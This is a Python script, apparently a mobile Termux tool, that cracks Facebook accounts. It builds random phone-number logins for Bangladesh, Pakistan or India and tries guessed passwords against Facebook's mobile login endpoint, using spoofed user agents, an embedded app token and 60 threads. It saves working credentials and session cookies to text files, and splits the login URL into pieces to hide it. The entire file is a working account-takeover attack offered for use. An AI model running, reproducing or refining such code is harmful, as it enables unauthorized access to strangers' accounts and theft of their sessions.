#————————{MODULE}——————————#
import os
import time
import random
import string
import re
import sys
import requests
import json
import uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool
try:os.system("pkg install espeak")
except:pass
#————————{UPDATE-CHECK}——————————#
os.system("git pull")
#————————{PROXY}——————————#
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:pass
proxsi=open('socksku.txt','r').read().splitlines()
#————————{COLOR}——————————#
B = '\x1b[1;90m'
R = '\x1b[1;91m'
G = '\x1b[1;92m'
H = '\x1b[1;93m'
BL = '\x1b[1;94m'
BG = '\x1b[1;95m'
S = '\x1b[1;96m'
W = '\x1b[1;97m'
EX = '\x1b[0m'
E = '\33[m'
color = [B,R,G,H,BL,BG,S,W,EX,E]
rong = random.choice(color)
#————————{UA}——————————#
def lmnXua():
    lmnXversion = ["393.0.0.47.197", "394.0.0.50.201", "392.0.0.45.190"]
    lmnXrv = random.randint(900000000, 999999999)
    lmnXbv = random.randint(90000000, 99999999)
    lmnXdensities = [2.0, 2.5, 3.0, 3.5, 4.0]
    lmnXwidth = random.choice([720, 1080, 1280, 1440])
    lmnXheight = random.choice([1280, 1920, 2160, 2400])
    lmnXlocales = ["en_US", "ru_RU", "fr_FR", "de_DE", "id_ID"]
    lmnXcarriers = ["LTE", "5G", "HSPA", "WiFi"]
    lmnXbrands = ["Xiaomi", "Samsung", "Huawei", "OnePlus", "Realme"]
    lmnXdevices = ["Poco F4", "Galaxy S21", "Mate 40", "OnePlus 9", "Realme GT"]
    lmnXandroid = ["10", "11", "12", "13", "14"]
    lmnXcpu = ["armeabi-v7a", "arm64-v8a", "x86", "x86_64"]
    lmnXagent = f"[FBAN/FB4A;FBAV/{random.choice(lmnXversion)};FBBV/{lmnXbv};" \
                 f"FBDM/{{density={random.choice(lmnXdensities)},width={lmnXwidth},height={lmnXheight}}};" \
                 f"FBLC/{random.choice(lmnXlocales)};FBRV/{lmnXrv};FBCR/{random.choice(lmnXcarriers)};" \
                 f"FBMF/{random.choice(lmnXbrands)};FBBD/{random.choice(lmnXbrands)};" \
                 f"FBPN/com.facebook.katana;FBDV/{random.choice(lmnXdevices)};FBSV/{random.choice(lmnXandroid)};" \
                 f"FBOP/1;FBCA/{random.choice(lmnXcpu)}]"
    return lmnXagent


#————————{LOOP}——————————#
ugen=[]
ugtn=[]
ugxn=[] 
ok=[]
cp=[]
twf=[]
lop=0
xode=[]
plist=[]
cpx=[]
cokix=[]
apkx=[]
paswtrh = []
rcd=[]
rcdx=[]
#————————{STYLE}——————————#
dt="•"
version="0.0"
def line():
	print(f"{rong}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	
#————————{RANDOM-SYSTEM}——————————#
BDX=f"{rong}BD SIM CODE : {rong}017 015 018 019 013 016{rong}{rong}"
INDX=f"{rong}IND SIM CODE : {rong}9670 9725 8948 8795 6383{E}{rong}"
PAKX=f"{rong}PAK SIM CODE : {rong}0306 0315 0335 0345 0318{rong}{rong}"
LIMITX=f"EXAMPLE : {rong}1000{rong},{rong}5000{rong},{rong}10000{rong},{rong}15000{rong},{rong}20000{rong}"
#————————{TOOL-OPTIONS}——————————#
CPG=f"[{rong}+{rong}] Do you went show cp account (y/n)"
CKIG=f"[{rong}+{rong}] Do you went show cookie (y/n)"
chc=f'{rong}[{rong}+{rong}] Choice : {rong}'
flp=f"{rong}[{rong}•{rong}] PUT FILE PATH\033[1;37m : {rong}"
chcps=f'EXAMPLE: {rong}first123{rong},{rong}last123{rong},{rong}firstlast{rong},{rong}name{rong}'
mxxt=f'{rong}[{rong}A{rong}] METHOD [{rong}1{rong}]\n{rong}[{rong}B{rong}] METHOD [{rong}2{rong}]\n{rong}[{rong}C{rong}] METHOD [{rong}3{rong}]'
nflp=f"[{rong}!{rong}] FILE LOCATION NOT FOUND "
#————————{LOGO}——————————#
os.system('espeak -a 300 "well,come"')
def logo():
	os.system('clear');print(f"""{rong}
	</> Ahmed < />
{lmnXua()}""")
#————————{RANDOM-CRACK-SYSTEM}——————————#
def Main():
	logo()
	print(f' {rong}[{rong}A{rong}]{rong} RANDOM CRACK [{rong}BANGLADESH{rong}]');print(f' {rong}[{rong}B{rong}]{rong} RANDOM CRACK [{rong}PAKISTAN{rong}]');print(f' {rong}[{rong}C{rong}]{rong} RANDOM CRACK [{rong}INDIA{rong}]')
	line()
	ghx=input(f' [{rong}+{rong}] Choice : {rong}')
	if ghx in ["A","a","1"]:rcd.append(f'1');rmenu1()
	elif ghx in ["B","b","2"]:rcd.append(f'2');rmenu1()
	elif ghx in ["C","c","3"]:rcd.append(f'3');rmenu1()
	else:line();print(f'\n \t {rong}Choose valid option{rong}');time.sleep(1);Main()
#————————{RANDOM-MENU-SYSTEM}——————————#
def rmenu1():
	logo()
	if "1" in rcd:print(f"{BDX}");line()
	if "2" in rcd:print(f"{PAKX}");line()
	if "3" in rcd:print(f"{INDX}");line()
	code=input(f'{chc}');print(f"{rong}{40*'='}")
	print(f'{LIMITX}');line()
	limit=int(input(f'[{rong}+{rong}] Limit : {rong}'))
	print(f"{rong}{40*'='}");print(f'{CPG}');line()
	cx=input(f'[{chc}')
	if cx in ['n','N','no','NO','2']:cpx.append(f'n')
	else:cpx.append(f'y')
	print(f"{rong}{40*'='}");print(f'{CKIG}');line()
	ckiv=input(f'{chc}')
	if ckiv in ['n','N','no','NO','2']:cokix.append(f'n')
	else:cokix.append(f'y')
	for number in range(limit):
		if "1" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(8));xode.append(numberx)
		if "2" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(7));xode.append(numberx)
		if "3" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(6));xode.append(numberx)
	with ThreadPool(max_workers=60) as tonxoys:
		tid= str(len(xode))
		logo();print(f' [{rong}•{rong}] TOTAL ID :\033[1;92m '+tid);print (f' {rong}[{rong}•{rong}] \033[1;97mSIM CODE : \033[1;92m'+code);print(f' {rong}[{rong}•{rong}] \033[1;37mTHE PROCESS HAS BEEN STARTED');print(f' [{rong}•{rong}] \033[1;37mUSE AEROPLANE MODE IN EVERY 5 MIN ');print(40*"=")
		for rngx in xode:
			id=code+rngx
			if "1" in rcd:psd=[id,rngx,id[:6],id[:7],id[:8],id[5:],"bangladesh","i love you","jannat","sadia@#","abusayid","taniya"]
			if "2" in rcd:psd=[id,rngx,id[5:],"khan123"]
			if "3" in rcd:psd=[id,rngx,id[:6],"57273200"]
			tonxoys.submit(graphrm,id,psd,tid)
#————————{B-GRAP-METHOD}——————————#
lk=[]
def graphrm(id,psd,tid):
	global ok,cp,lk,lop
	togg=[]
	sys.stdout.write(f'\r\r{rong}[{rong}Ahmed-M1{rong}]{rong}{rong}{rong}[{rong}{lop}{rong}/{rong}{tid}{rong}]{rong}{rong}[{rong}OK{rong}:{rong}%s{rong}/{rong}%s{rong}]{rong}'%(len(ok),len(cp)));sys.stdout.flush()
	for psw in psd:
		
		datax= {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': id,'password': psw,'generate_analytics_claims': '1', 'community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB', 'fb_api_req_friendly_name': 'authenticate'}
		header={'User-Agent': lmnXua(),'Accept-Encoding':  'gzip, deflate','Accept': '*/*', 'Connection': 'keep-alive','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
		twfx= 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
		lo=requests.post('https://'+'b-gr'+'ap'+'h'+'.facebook.com/auth/login',data=datax,headers=header,allow_redirects=False).json()
		if 'session_key' in lo:
			cki = lo["session_cookies"]
			ck={}
			for xk in cki:ck.update({xk["name"]:xk["value"]})
			coki = (";").join([ "%s=%s" % (key, value) for key, value in ck.items() ])
			iid= re.findall('c_user=(.*);xs', coki)[0]
			print(f'\r\r{rong}[Ahmed-OK] {iid} | {psw}{rong}');os.system('espeak -a 300 "ok id"');ok.append(id);open('/sdcard/Ahmed-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			if 'y' in cokix:print(f'\r\r{rong}[{rong}COOKIES🍪{rong}]{rong} : {rong}{coki}{rong}');print(f"{rong}{40*'-'}{rong}")
			break
		elif twfx in str(lo):
			iid = lo['error']['error_data']['uid']
			print(f'\r\r{rong}[Ahmed-2F] {iid} | {psw}{rong}');os.system('espeak -a 300 "two,f id"');open('/sdcard/Ahmed-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
		elif 'www.facebook.com' in lo['error']['message']:
			try:
				iid = lo['error']['error_data']['uid']
			except:
				iid=id
			if iid in ok:pass
			else:
				if 'y' in cpx:
					print(f'\r\r{rong}[Ahmed-CP] {iid} | {psw}{rong}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/Ahmed-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
Main()
